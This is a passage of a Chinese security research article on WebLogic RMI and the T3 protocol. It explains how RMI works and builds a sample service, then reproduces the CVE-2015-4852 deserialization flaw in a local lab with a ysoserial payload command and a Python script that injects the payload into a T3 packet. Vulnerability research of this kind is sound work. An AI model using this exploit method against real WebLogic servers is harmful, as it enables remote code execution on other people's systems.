我们可以清晰的从客户端调用包和服务端返回包中看到Java序列化魔术头`0xac 0xed`：

![56.png](https://nosec.org/avatar/uploads/attach/image/a6016acbcfc68a1fbbbe7fd6e9389b46/56.png)

因此可以证实Java RMI的调用过程是依赖Java序列化和反序列化的。

简单解释一下RMI的整个调用流程：

![57.png](https://nosec.org/avatar/uploads/attach/image/456ac9227a7a1628ea8efc20a36ea1f7/57.png)

1. 客户端通过客户端的Stub对象欲调用远程主机对象上的方法
2. Stub代理客户端处理远程对象调用请求，并且序列化调用请求后发送网络传输
3. 服务端远程调用Skeleton对象收到客户端发来的请求，代理服务端反序列化请求，传给服务端
4. 服务端接收到请求，方法在服务端执行然后将返回的结果对象传给Skeleton对象
5. Skeleton接收到结果对象，代理服务端将结果序列化，发送给客户端
6. 客户端Stub对象拿到结果对象，代理客户端反序列化结果对象传给客户端

我们不难发现，Java RMI的实现运用了程序设计模式中的代理模式，其中Stub代理了客户端处理RMI，Skeleton代理了服务端处理RMI。

#### **WebLogic RMI**

WebLogic RMI和T3反序列化漏洞有很大关系，因为T3就是WebLogic RMI所使用的协议。网上关于漏洞的PoC很多，但是我们通过那些PoC只能看到它不正常（漏洞触发）的样子，却很少能看到它正常工作的样子。那么我们就从WebLogic RMI入手，一起看看它应该是什么样的。

**WebLogic RMI就是WebLogic对Java RMI的实现**，它和我刚才讲过的Java RMI大体一致，在功能和实现方式上稍有不同。我们来细数一下WebLogic RMI和Java RMI的不同之处。

* WebLogic RMI支持集群部署和负载均衡

因为WebLogic本身就是为分布式系统设计的，因此WebLogic RMI支持集群部署和负载均衡也不难理解了。

* WebLogic RMI的服务端会使用字节码生成（Hot Code Generation）功能生成代理对象

WebLogic的字节码生成功能会自动生成服务端的字节码到内存。不再生成Skeleton骨架对象，也不需要使用`UnicastRemoteobject`对象。

* WebLogic RMI客户端使用动态代理

在WebLogic RMI 客户端中，字节码生成功能会自动为客户端生成代理对象，因此`Stub`也不再需要。

* **WebLogic RMI主要使用T3协议（还有基于CORBA的IIOP协议）进行客户端到服务端的数据传输**

T3传输协议是WebLogic的自有协议，它有如下特点：

1. 服务端可以持续追踪监控客户端是否存活（心跳机制），通常心跳的间隔为60秒，服务端在超过240秒未收到心跳即判定与客户端的连接丢失。
2. 通过建立一次连接可以将全部数据包传输完成，优化了数据包大小和网络消耗。

下面我再简单的实现一下WebLogic RMI，实现依据Oracle的WebLogic 12.2.1的官方文档，但是官方文档有诸多错误，所以我下面的实现和官方文档不尽相同但保证可以运行起来。

首先依然是创建服务端对象类，先创建一个接口继承`java.rmi.Remote`:

```text
// IHello.java

package examples.rmi.hello;

import java.rmi.RemoteException;

public interface IHello extends java.rmi.Remote {

    String sayHello() throws RemoteException;

}
```

创建服务端对象类，实现这个接口：

```text
// HelloImpl.java

public class HelloImpl implements IHello {

    public String sayHello() {

        return "Hello Remote World!!";

    }

}
```

创建服务端远程对象，此时已不需要`Skeleton`对象和`UnicastRemoteobject`对象：

```text
// HelloImpl.java

package examples.rmi.hello;

import javax.naming.*;

import java.rmi.RemoteException;

public class HelloImpl implements IHello {

    private String name;

    public HelloImpl(String s) throws RemoteException {

        super();

        name = s;

    }

    public String sayHello() throws java.rmi.RemoteException {

        return "Hello World!";

    }

    public static void main(String args[]) throws Exception {

        try {

            HelloImpl obj = new HelloImpl("HelloServer");

            Context ctx = new InitialContext();

            ctx.bind("HelloServer", obj);

            System.out.println("HelloImpl created and bound in the registry " +

                    "to the name HelloServer");

        } catch (Exception e) {

            System.err.println("HelloImpl.main: an exception occurred:");

            System.err.println(e.getMessage());

            throw e;

        }

    }

}
```

WebLogic RMI的服务端已经构建完成，客户端也不再需要`Stub`对象：

```text
// HelloClient.java

package examples.rmi.hello;

import java.util.Hashtable;

import javax.naming.Context;

import javax.naming.InitialContext;

import javax.naming.NamingException;

public class HelloClient {

    // Defines the JNDI context factory.

    public final static String JNDI_FACTORY = "weblogic.jndi.WLInitialContextFactory";

    int port;

    String host;

    private static void usage() {

        System.err.println("Usage: java examples.rmi.hello.HelloClient " +

                "<hostname> <port number>");

    }

    public HelloClient() {

    }

    public static void main(String[] argv) throws Exception {

        if (argv.length < 2) {

            usage();

            return;

        }

        String host = argv[0];

        int port = 0;

        try {

            port = Integer.parseInt(argv[1]);

        } catch (NumberFormatException nfe) {

            usage();

            throw nfe;

        }

        try {

            InitialContext ic = getInitialContext("t3://" + host + ":" + port);

            IHello obj = (IHello) ic.lookup("HelloServer");

            System.out.println("Successfully connected to HelloServer on " +

                    host + " at port " +

                    port + ": " + obj.sayHello());

        } catch (Exception ex) {

            System.err.println("An exception occurred: " + ex.getMessage());

            throw ex;

        }

    }

    private static InitialContext getInitialContext(String url)

            throws NamingException {

        Hashtable<String, String> env = new Hashtable<String, String>();

        env.put(Context.INITIAL_CONTEXT_FACTORY, JNDI_FACTORY);

        env.put(Context.PROVIDER_URL, url);

        return new InitialContext(env);

    }

}
```

最后记得项目中引入`wlthint3client.jar`这个jar包供客户端调用时可以找到`weblogic.jndi.WLInitialContextFactory`。

简单的WebLogic RMI服务端和客户端已经构建完成，此时我们无法直接运行，需要生成jar包去WebLogic Server 管理控制台中部署运行。

生成jar包可以使用大家常用的build工具，如ant、maven等。我这里提供的是maven的构建配置：

```text
<?xml version="1.0" encoding="UTF-8"?>

<project xmlns="http://maven.apache.org/POM/4.0.0"

         xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"

         xsi:schemaLocation="http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd">

    <modelVersion>4.0.0</modelVersion>

    <groupId>examples.rmi</groupId>

    <artifactId>hello</artifactId>

    <version>1.0-SNAPSHOT</version>

    <build>

        <plugins>

            <plugin>

                <groupId>org.apache.maven.plugins</groupId>

                <artifactId>maven-compiler-plugin</artifactId>

                <configuration>

                    <source>1.8</source>

                    <target>1.8</target>

                </configuration>

            </plugin>

            <plugin>

                <groupId>org.apache.maven.plugins</groupId>

                <artifactId>maven-jar-plugin</artifactId>

                <configuration>

                    <archive>

                        <manifest>

                            <addClasspath>true</addClasspath>

                            <useUniqueVersions>false</useUniqueVersions>

                            <classpathPrefix>lib/</classpathPrefix>

                            <mainClass>examples.rmi.hello.HelloImpl</mainClass>

                        </manifest>

                    </archive>

                </configuration>

            </plugin>

        </plugins>

    </build>

</project>
```

构建成功后，将jar包复制到WebLogic Server域对应的`lib/`文件夹中，通过WebLogic Server 管理控制台中的启动类和关闭类部署到WebLogic Server中，新建启动类如下：

![58.png](https://nosec.org/avatar/uploads/attach/image/9107d3dc6d9b2e8ab965319085652db4/58.png)

重启WebLogic，即可在启动日志中看到如下内容：

```text
HelloImpl created and bound in the registry to the name HelloServer
```

并且在服务器的JNDI树信息中可以看到`HelloServer`已存在：

![59.png](https://nosec.org/avatar/uploads/attach/image/0beff5915817e3808fc78dacfdf58ce7/59.png)

WebLogic RMI的服务端已经部署完成，客户端只要使用java命令正常运行即可：

```text
$java -cp ".;wlthint3client.jar;hello-1.0-SNAPSHOT.jar" examples.rmi.hello.HelloClient 127.0.0.1 7001
```

运行结果如下图：

![60.png](https://nosec.org/avatar/uploads/attach/image/8c1de7b38bbfedc9c6f1337013e4fd80/60.png)

我们完成了一次正常的WebLogic RMI调用过程，我们也来看一下WebLogic RMI的调用数据包：

![61.png](https://nosec.org/avatar/uploads/attach/image/16fa89e218e5774b7366d599b9fe27d9/61.png)

我在抓包之后想过找一份完整的T3协议的定义去详细的解释T3协议，但或许因为WebLogic不是开源软件，我最终没有找到类似的协议定义文档。因此我只能猜测T3协议包中每一部分的作用。虽然是猜测，但还是有几点值得注意，和漏洞利用关系很大，我放到下一节说。

再来看一下WebLogic RMI的调用流程：

![62.png](https://nosec.org/avatar/uploads/attach/image/a402f2952f3de82c39d76a9bc37e421c/62.png)

前置知识讲完了，小结一下这些概念的关系，Java RMI即远程方法调用，默认使用JRMP协议通信。WebLogic RMI是WebLogic对Java RMI的实现，其使用T3或IIOP协议作为通信协议。无论是Java RMI还是WebLogic RMI，都需要使用JNDI去发现远端的RMI服务。

两张图来解释它们的关系：

![63.png](https://nosec.org/avatar/uploads/attach/image/c87feff3d10c1a02b4f72e93ef5ed374/63.png)

#### **漏洞原理**

上面，我详细解释了WebLogic RMI的调用过程，我们初窥了一下T3协议。那么现在我们来仔细看一下刚才抓到的正常WebLogic RMI调用时T3协议握手后的第一个数据包,有几点值得注意的是：

* 我们发现每个数据包里不止包含一个序列化魔术头（0xac 0xed 0x00 0x05）
* 每个序列化数据包前面都有相同的二进制串（0xfe 0x01 0x00 0x00）
* 每个数据包上面都包含了一个T3协议头
* 仔细看协议头部分，我们又发现数据包的前4个字节正好对应着数据包长度
* 以及我们也能发现包长度后面的“01”代表请求，“02”代表返回

![64.png](https://nosec.org/avatar/uploads/attach/image/6a43d143911b4ae3bd883cd75ac78403/64.png)

这些点说明了T3协议由协议头包裹，且数据包中包含多个序列化的对象。那么我们就可以尝试构造恶意对象并封装到数据包中重新发送了。流程如下：

![65.png](https://nosec.org/avatar/uploads/attach/image/cbbccb2fe9f65b59752b0dddad1fa36d/65.png)

替换序列化对象示意图如下：

![66.png](https://nosec.org/avatar/uploads/attach/image/192cde66b334bdd33eede041aeb46a7b/66.png)

剩下的事情就是找到合适的利用链了（通常也是最难的事）。

我用最经典的CVE-2015-4852漏洞，使用Apache Commons Collections链复现一下整个过程，制作一个简单的PoC。

首先使用Ysoserial生成Payload：

```text
 $java -jar ysoserial.jar CommonsCollections1 'touch /hacked_by_tunan.txt' > payload.bin
```

然后我们使用Python发送T3协议的握手包，直接复制刚才抓到的第一个包的内容，看下效果如何：

```text
#!/usr/bin/python

#coding:utf-8

# weblogic_basic_poc.py

import socket

import sys

import struct

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

# 第一个和第二个参数，传入目标IP和端口

server_address = (sys.argv[1], int(sys.argv[2]))

print 'connecting to %s port %s' % server_address

sock.connect(server_address)

# 发送握手包

handshake='t3 12.2.3\nAS:255\nHL:19\nMS:10000000\n\n'

print 'sending "%s"' % handshake

sock.sendall(handshake)

data = sock.recv(1024)

print 'received "%s"' % data
```

执行一下看结果：

```text
$python weblogic_basic_poc.py 127.0.0.1 7001

connecting to 127.0.0.1 port 7001

sending "t3 12.1.3

AS:255

HL:19

MS:10000000

"

received "HELO:10.3.6.0.false

AS:2048

HL:19

"
```

很好，和上面抓到的包一样，握手成功。继续下一步。下一步我需要替换掉握手后的第一个数据包中的一组序列化数据，这个数据包原本是客户端请求WebLogic RMI发的T3协议数据包。假设我们替换第一组序列化数据：

```text
# weblogic_basic_poc.py

# 第三个参数传入一个文件名，在本例中为刚刚生成的“payload.bin”

payloadObj = open(sys.argv[3],'rb').read()

# 复制自原数据包，从24到155

payload='\x00\x00\x05\xf8\x01\x65\x01\xff\xff\xff\xff\xff\xff\xff\xff\x00\x00\x00\x72\x00\x00\xea\x60\x00\x00\x00\x19\...omit...\x70\x06\xfe\x01\x00\x00'

# 要替换的Payload

payload=payload+payloadObj

# 复制剩余数据包，从408到1564

payload=payload+'\xfe\x01\x00\x00\xac\xed\x00\x05\x73\x72\x00\x1d\x77\x65\x62\x6c\x6f\x67\x69\x63\x2e\x72\x6a\x76\x6d\x2e\x43\x6c\x61...omit...\x00\x00\x00\x00\x78'

# 重新计算数据包大小并替换原数据包中的前四个字节

payload = "{0}{1}".format(struct.pack('!i', len(payload)), payload[4:])

print 'sending payload...'

sock.send(payload)
```

PoC构造完成，验证下效果：

```text
$python weblogic_basic_poc.py 127.0.0.1 7001 payload.bin

connecting to 127.0.0.1 port 7001

sending "t3 12.1.3

AS:255

HL:19

MS:10000000

"

received "HELO:10.3.6.0.false

AS:2048

HL:19

"

sending payload...
```

![67.png](https://nosec.org/avatar/uploads/attach/image/f29783442e05d2b7833f7a6f6d4b3d8b/67.png)

执行后去目标系统根目录下，可以看到`hacked_by_tunan.txt`这个文件被创建成功，漏洞触发成功。

#### **简要漏洞分析**

简要的分析一下这个漏洞，远程调试时断点应下在`wlserver/server/lib/wlthint3client.jar/weblogic/InboundMsgAbbrev`的`readobject()`中。

![68.png](https://nosec.org/avatar/uploads/attach/image/c8ddb20b8267d0fb69d2c5e1ac316b55/68.png)

可以看到此处即对我生成的恶意对象进行了反序列化，此处为第一次反序列化，不是命令的执行点。后续的执行过程和经典的apache-commons-collections反序列化漏洞执行过程一致，需要继续了解可参考@gyyyy的文章：《浅析Java序列化和反序列化——经典的apache-commons-collections》\([https://github.com/gyyyy/footprint/blob/master/articles/2019/about-java-serialization-and-deserialization.md\#%E7%BB%8F%E5%85%B8%E7%9A%84apache-commons-collections](https://github.com/gyyyy/footprint/blob/master/articles/2019/about-java-serialization-and-deserialization.md#%E7%BB%8F%E5%85%B8%E7%9A%84apache-commons-collections)\)

#### **补丁分析**

WebLogic T3反序列化漏洞用黑名单的方式修复，补丁位置在`Weblogic.utils.io.oif.WebLogicFilterConfig.class`:

![69.png](https://nosec.org/avatar/uploads/attach/image/d544ec9c3a23e16cfb66a1ff21f0bfbe/69.png)

此类型漏洞也经历了多次修复绕过的过程。

#### WebLogic其他漏洞

WebLogic是一个Web漏洞库，其中以反序列化漏洞为代表，后果最为严重。另外还有几个月前爆出的XXE漏洞：CVE-2019-2647、CVE-2019-2648、CVE-2019-2649、CVE-2019-2650、任意文件上传漏洞：CVE-2018-2894。此文不再展开讨论，感兴趣的可以对照上表中的文章详细了解。

## WebLogic环境搭建工具

前面说到，WebLogic环境搭建过程很繁琐，很多时候需要测试各种WebLogic版本和各种JDK版本的排列组合，因此我在这次研究的过程中写了一个脚本级别的WebLogic环境搭建工具。这一小节我会详细的说一下工具的构建思路和使用方法，也欢迎大家继续完善这个工具，节省大家搭建环境的时间。工具地址：[https://github.com/QAX-A-Team/WeblogicEnvironment](https://github.com/QAX-A-Team/WeblogicEnvironment)

此环境搭建工具使用Docker和shell脚本，因此需要本机安装Docker才可以使用。经测试漏洞搭建工具可以在3分钟内构建出任意JDK版本搭配任意WebLogic版本，包含一个可远程调试的已启动的WebLogic Server域环境。

#### 需求

* 自动化安装任意版本JDK
* 自动化安装任意版本WebLogic Server
* 自动化创建域
* 自动打开远程调试
* 自动启动一个WebLogic Server域

#### 流程

![](../.gitbook/assets/image%20%2859%29.png)

#### 使用方法：

**下载JDK安装包和WebLogic安装包**

下载相应的JDK版本和WebLogic安装包，将JDK安装包放到`jdks/`目录下，将WebLogic安装包放到`weblogics/`目录下。**此步骤必须手动操作，否则无法进行后续步骤。**

![71.png](https://nosec.org/avatar/uploads/attach/image/1a8f30a44ddb35fd2204f30fc670ec39/71.png)

JDK安装包下载地址：[https://www.oracle.com/technetwork/java/javase/archive-139210.htmlWebLogic](https://www.oracle.com/technetwork/java/javase/archive-139210.htmlWebLogic)安装包下载地址：[https://www.oracle.com/technetwork/middleware/weblogic/downloads/wls-for-dev-1703574.html](https://www.oracle.com/technetwork/middleware/weblogic/downloads/wls-for-dev-1703574.html)

**构建镜像并运行**

回到根目录，执行Docker构建镜像命令：

```text
docker build --build-arg JDK_PKG=<YOUR-JDK-PACKAGE-FILE-NAME> --build-arg WEBLOGIC_JAR=<YOUR-WEBLOGIC-PACKAGE-FILE-NAME>  -t <DOCKER-IMAGE-NAME> .
```

镜像构建完成后，执行以下命令运行：

```text
docker run -d -p 7001:7001 -p 8453:8453 -p 5556:5556 --name <CONTAINER-NAME> <DOCKER-IMAGE-NAME-YOU-JUST-BUILD>
```

以WebLogic12.1.3配JDK 7u21为例，构建镜像命令如下：

```text
docker build --build-arg JDK_PKG=jdk-7u21-linux-x64.tar.gz --build-arg WEBLOGIC_JAR=fmw_12.1.3.0.0_wls.jar  -t weblogic12013jdk7u21 .
```

镜像构建完成后，执行以下命令运行：

```text
docker run -d -p 7001:7001 -p 8453:8453 -p 5556:5556 --name weblogic12013jdk7u21 weblogic12013jdk7u21
```

运行后可访问`[[`[`http://localhost:7001/console/login/LoginForm.jsp`](http://localhost:7001/console/login/LoginForm.jsp)`](`[`http://localhost:7001/console/login/LoginForm.jsp`](http://localhost:7001/console/login/LoginForm.jsp)`)]([`[`http://localhost:7001/console/login/LoginForm.jsp`](http://localhost:7001/console/login/LoginForm.jsp)`](`[`http://localhost:7001/console/login/LoginForm.jsp`](http://localhost:7001/console/login/LoginForm.jsp)`))`登录到WebLogic Server管理控制台，默认用户名为`weblogic`,默认密码为`qaxateam01`

**远程调试**

如需远程调试，需使用`docker cp`将远程调试需要的目录从已运行的容器复制到本机。

也可以使用`run_weblogic1036jdk6u25.sh`、`run_weblogic12013jdk7u21sh`、`run_weblogic12021jdk8u121.sh`这三个脚本进行快速环境搭建并复制远程调试需要用到的目录。执行前请赋予它们相应的可执行权限。

**示例**

以JDK 7u21配合WebLogic 12.1.3为例，自动搭建效果如下：

![](../.gitbook/assets/image%20%2858%29.png)

#### 兼容性测试

已测试了如下环境搭配的兼容性：

* 测试系统：macOS Mojave 10.14.5
* Docker版本：Docker 18.09.2
* WebLogic 10.3.6 With JDK 6u25
* WebLogic 10.3.6 With JDK 7u21
* WebLogic 10.3.6 With JDK 8u121
* WebLogic 12.1.3 With JDK 7u21
* WebLogic 12.1.3 With JDK 8u121
* WebLogic 12.2.1 With JDK 8u121

#### 已知问题

* 由于时间关系，我没有对更多WebLogic版本和更多的JDK版本搭配做测试，请自行测试
* 请时刻关注输出内容，如出现异常请自行修改对应脚本

欢迎大家一起为此自动化环境搭建工具贡献力量。

## 总结

分析WebLogic漏洞异常辛苦，因为没有足够的资料去研究。因此想写这篇文帮助大家。但这篇文行文也异常痛苦，同样是没有资料，官方文档还有很多错误，很无奈。希望这篇文能对WebLogic的安全研究者有所帮助。不过通过写这篇文，我发现无论怎样也只是触及到了WebLogic的冰山一角，它很庞大，或者不客气的说很臃肿。我们能了解的太少太少，也注定还有很多点是没有被人开发过，比如WebLogic RMI不止T3一种协议，实现`weblogic.jndi.WLInitialContextFactory`的也不止有`wlthint3client.jar`这一个jar包。还望大家继续深挖。

## 参考

1. [https://xz.aliyun.com/t/5448](https://xz.aliyun.com/t/5448)
2. [https://paper.seebug.org/584/](https://paper.seebug.org/584/)
3. [https://paper.seebug.org/333/](https://paper.seebug.org/333/)
4. [https://xz.aliyun.com/t/1825/\#toc-2](https://xz.aliyun.com/t/1825/#toc-2)
5. [http://www.saxproject.org/copying.html](http://www.saxproject.org/copying.html)
6. [https://www.4hou.com/vulnerable/12874.html](https://www.4hou.com/vulnerable/12874.html)
7. [https://docs.oracle.com/javase/1.5.0/docs/guide/rmi/](https://docs.oracle.com/javase/1.5.0/docs/guide/rmi/)
8. [https://mp.weixin.qq.com/s/QYrPrctdDJl6sgcKGHdZ7g](https://mp.weixin.qq.com/s/QYrPrctdDJl6sgcKGHdZ7g)
9. [https://docs.oracle.com/cd/E11035\_01/wls100/client/index.html](https://docs.oracle.com/cd/E11035_01/wls100/client/index.html)
10. [https://docs.oracle.com/cd/E11035\_01/wls100/client/index.html](https://docs.oracle.com/cd/E11035_01/wls100/client/index.html)
11. [https://docs.oracle.com/middleware/12212/wls/INTRO/preface.htm\#INTRO119](https://docs.oracle.com/middleware/12212/wls/INTRO/preface.htm#INTRO119)
12. [https://docs.oracle.com/middleware/1213/wls/WLRMI/preface.htm\#WLRMI101](https://docs.oracle.com/middleware/1213/wls/WLRMI/preface.htm#WLRMI101)
13. [https://docs.oracle.com/middleware/11119/wls/WLRMI/rmi\_imp.htm\#g1000014983](https://docs.oracle.com/middleware/11119/wls/WLRMI/rmi_imp.htm#g1000014983)
14. [https://github.com/gyyyy/footprint/blob/master/articles/2019/about-java-serialization-and-deserialization.md](https://github.com/gyyyy/footprint/blob/master/articles/2019/about-java-serialization-and-deserialization.md)
15. [http://www.wxylyw.com/2018/11/03/WebLogic-xmlDecoder%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/](http://www.wxylyw.com/2018/11/03/WebLogic-xmlDecoder%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/)
16. [https://foxglovesecurity.com/2015/11/06/what-do-weblogic-websphere-jboss-jenkins-opennms-and-your-application-have-in-common-this-vulnerability/](https://foxglovesecurity.com/2015/11/06/what-do-weblogic-websphere-jboss-jenkins-opennms-and-your-application-have-in-common-this-vulnerability/)

◆来源：[奇安信](https://mp.weixin.qq.com/s?__biz=MzU5NDgxODU1MQ==&mid=2247485058&idx=1&sn=d22b310acf703a32d938a7087c8e8704&chksm=fe7a221ac90dab0cac2aaed6deebe7c56e316f767e2fb91e44e8e08aaa0a48790b4eefb447df&mpshare=1&scene=1&srcid=&sharer_sharetime=1565607726135&sharer_shareid=37947731a17f1281ace10f1fc77146cf&key=e8e84aec0427272da90fdc17f4bdf02bb340c1eb7a12b95f91e0bd42a37b76b919e3b2d20fdbf79e4f262cbca90cb1e29a91ce86770010f67819219ef5c033a219db24ca7e87f72ed8786fa9ba946908&ascene=1&uin=MjMwMDM5OTYzMg%3D%3D&devicetype=Windows+10&version=62060833&lang=zh_CN&pass_ticket=l1uvYU9tgLWZe8D9eDAO27kX2BaRjKEi4OgpXzqLM1dXvVoo7n38b4y80UnpE3At)

◆本文版权归原作者所有，如有侵权请联系我们及时删除

